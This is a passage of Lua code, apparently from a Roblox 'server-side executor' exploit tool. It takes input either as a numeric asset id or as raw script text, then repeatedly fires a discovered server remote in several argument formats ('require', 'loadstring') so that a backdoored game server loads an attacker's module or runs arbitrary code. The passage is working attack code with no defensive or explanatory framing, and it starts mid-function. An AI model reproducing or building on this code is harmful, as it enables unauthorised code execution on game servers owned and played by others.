		local numericId = string.match(cleanInput, "^require%(%s*(%d+)%s*%)") or string.match(cleanInput, "^(%d+)$")
	
		if numericId then
			-- Target requires formatted identically to the classic SS runtime payload distribution structures
			pcall(function()
				verifiedServerRemote:FireServer("require", tonumber(numericId))
			end)
			pcall(function()
				verifiedServerRemote:FireServer(tonumber(numericId))
			end)
			pcall(function()
				verifiedServerRemote:FireServer("require(" .. numericId .. ")")
			end)
		else
			-- Treat input text string as compilation code blocks (loadstring/run mode)
			pcall(function()
				verifiedServerRemote:FireServer(textBuffer)
			end)
			pcall(function()
				verifiedServerRemote:FireServer("loadstring", textBuffer)
			end)
		end
	end
	
